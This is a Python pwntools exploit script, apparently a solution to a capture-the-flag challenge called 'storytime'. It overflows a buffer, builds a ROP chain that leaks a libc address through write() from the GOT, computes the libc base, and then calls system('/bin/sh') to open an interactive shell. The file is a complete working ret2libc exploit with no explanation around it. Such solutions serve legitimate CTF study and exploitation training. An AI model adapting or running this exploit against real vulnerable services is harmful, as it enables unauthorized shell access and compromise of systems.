#!/usr/bin/python3
from pwn import *

context.log_level = 'debug'
exe = context.binary = ELF("/tmp/patch/storytime_patched", checksec=False)
#libc = ELF("/usr/lib/x86_64-linux-gnu/libc.so.6", checksec=False)
libc = ELF("/tmp/patch/libc.so.6", checksec=False)

p = process()
#p = remote()

#gdb.attach(p, gdbscript='''
#        b*0x0000000000400B11
#        c
#''')

pop_rdi = 0x0000000000400703
pop_rsi_r15 = 0x0000000000400701
ret = 0x000000000040048e

input()
payload = b'A'*0x38
payload += p64(pop_rdi) + p64(1)
payload += p64(pop_rsi_r15) + p64(exe.got['write'])
payload += p64(ret)
payload += p64(exe.plt['write'])
payload += p64(exe.sym['main'])
p.sendafter(b"Tell me a story: \n", payload)

libc_leak = u64(p.recv(8))
libc.address = libc_leak - libc.sym['write']
log.info("Libc leak: " + hex(libc_leak))
log.info("Libc base: " + hex(libc.address))

payload = b'A'*0x38
payload += p64(pop_rdi) + p64(next(libc.search(b"/bin/sh\0")))
payload += p64(libc.sym['system'])
p.sendafter(b"Tell me a story: \n", payload)

p.interactive()
